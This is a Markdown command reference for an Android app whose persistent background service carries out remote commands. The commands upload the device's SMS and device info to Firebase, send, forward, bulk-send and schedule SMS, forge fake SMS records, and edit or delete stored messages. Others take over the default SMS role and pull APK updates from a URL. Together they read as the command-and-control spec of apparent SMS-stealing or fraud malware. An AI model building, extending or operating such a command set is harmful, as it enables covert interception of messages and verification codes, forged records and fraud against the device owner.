# Remote Commands Reference

This document summarizes each remote command, its purpose, and the possible
command history outcomes. Commands are handled in
`app/src/main/java/com/example/fast/service/PersistentForegroundService.kt`
via `followCommand()`.

## Command Lifecycle (History)
- `pending`: saved before execution.
- `executed`: command started or completed successfully.
- `failed`: command failed to start or validate.

The `errorMessage` field stores a short reason (when available).

## Commands

| Command key | Use / action | Content format / examples | Response reason (examples) | Notes |
| --- | --- | --- | --- | --- |
| `showNotification` | Show a local notification. | `showNotification|{title}|{message}|{channel}|{priority}|{action}` | `executed`, `failed` (exception). | Synchronous. |
| `sendSms` | Send SMS immediately. | `phone:message` or `sim;phone:message` | `executed`, `failed` (validation, permission). | Status updated after send/log steps. |
| `requestPermission` | Launch permission request flow. | `permission1,permission2,...` or `ALL` | `executed`, `failed` (exception). | Permissions: `sms`, `contacts`, `notification`, `battery`, `phone_state`. |
| `updateApk` | Trigger APK update. | `{downloadUrl}` or `{versionCode}|{downloadUrl}` | `executed`, `failed`. | Synchronous trigger. |
| `controlAnimation` | Start/stop UI animation. | `start`, `off sms`, `off instruction`, `off` | `executed`, `failed`. | Synchronous. |
| `syncNotification` | Enable/disable notification sync. | `on`, `off`, `realtime:{minutes}` | `executed`, `failed`. | Synchronous. |
| `fetchSms` | Upload SMS to Firebase. | `{count}` or empty (defaults to 10) | `executed`, `failed`. | Async; marked executed immediately. |
| `fetchDeviceInfo` | Upload device info. | Any value (ignored) | `executed`, `failed`. | Async; marked executed immediately. |
| `reset` | Reset activation + state. | Any value (ignored) | `executed`, `failed`. | Async; marked executed immediately. |
| `checkPermission` | Check permissions and upload status. | empty or `status` | `executed`, `failed`. | Async; marked executed immediately. |
| `removePermission` | Open app settings to remove permissions. | empty or `open` | `executed`, `failed`. | Synchronous trigger. |
| `requestDefaultSmsApp` | Ask user to set app as default SMS app. | Any value (ignored) | `executed` with reasons: `already_default`, `request_ui_launched`, `fallback_system_dialog`, `user_set_default_sms`; `failed` with reasons: `user_declined_default_sms`, `no_action`, `request_failed:*`, `request_launch_error:*`. | Starts `DefaultSmsRequestActivity`, which updates final status based on user action. |
| `requestDefaultMessageApp` | Same as `requestDefaultSmsApp`. | Any value (ignored) | Same as above. | Delegates to default SMS handler. |
| `setHeartbeatInterval` | Update heartbeat interval. | `{seconds}` | `executed`, `failed`. | Synchronous. |
| `updateDeviceCodeList` | Update device list in Firebase. | Any value (ignored) | `executed`, `failed`. | Async; marked executed immediately. |
| `sendSmsDelayed` | Send SMS after delay. | `phone:message:delayType:delayValue:sim` | `executed`, `failed` (validation, permission). | Status updated after schedule write. |
| `scheduleSms` | Schedule recurring SMS. | `phone:message:scheduleType:scheduleValue:recurrence:sim` | `executed`, `failed` (validation, permission). | Status updated after schedule write. |
| `editMessage` | Edit stored SMS by ID. | `messageId:field:newValue` | `executed`, `failed` (validation, permission, not found). | Synchronous. |
| `deleteMessage` | Delete SMS (single or bulk). | `messageId` or `bulk:{criteria}` | `executed`, `failed` (validation, permission, not found). | Synchronous. |
| `createFakeMessage` | Create a fake SMS record. | `sender:message:timestamp:status:threadId` | `executed`, `failed` (validation). | Synchronous. |
| `createFakeMessageTemplate` | Create a template for fake SMS. | `templateId:sender:variables` | `executed`, `failed` (validation). | Synchronous. |
| `setupAutoReply` | Configure auto-reply rules. | `enabled:trigger:replyMessage:conditions` | `executed`, `failed` (validation). | Synchronous. |
| `showCard` | Show SMS or instruction card. | `sms` or `instruction` | `executed`, `failed`. | Synchronous. |
| `startAnimation` | Trigger card animation. | `sms`, `instruction`, or `flip` | `executed`, `failed`. | Synchronous. |
| `forwardMessage` | Forward SMS to target number. | `messageId:targetNumber:modify:newMessage` | `executed`, `failed` (validation, permission). | Status updated after log/write. |
| `sendBulkSms` | Send bulk SMS. | `recipients:message:personalize:delay:sim` | `executed`, `failed` (validation, permission). | Status updated after creation. |
| `bulkEditMessage` | Bulk edit messages by criteria. | `criteria:field:newValue` | `executed`, `failed` (validation, permission). | Synchronous. |
| `sendSmsTemplate` | Send SMS from template. | `templateId:phone:variables` | `executed`, `failed` (validation, permission). | Synchronous. |
| `saveTemplate` | Save a message template. | `templateId|content|category` | `executed`, `failed` (validation). | Uses `|` delimiter. |
| `deleteTemplate` | Delete a custom template. | `templateId` | `executed`, `failed` (validation). | Synchronous. |
| `getMessageStats` | Compute message stats. | `period:format` | `executed`, `failed` (permission). | Synchronous. |
| `backupMessages` | Backup SMS to Firebase. | `type:encrypt:format` | `executed`, `failed` (permission, format). | Status updated after write. |
| `exportMessages` | Export SMS to Firebase. | `format:criteria` | `executed`, `failed` (permission, format). | Status updated after write. |
| `executeWorkflow` | Execute a workflow (multiple steps). | JSON workflow definition | `executed` if all steps succeed; `failed` if any step fails. | Status updated on completion callback. |
| `smsbatchenable` | Set SMS batch upload interval. | `{seconds}` | `executed`, `failed`. | Synchronous. |

## Unknown Commands
Any unknown command key is recorded as `failed` with reason `Unknown command key`.
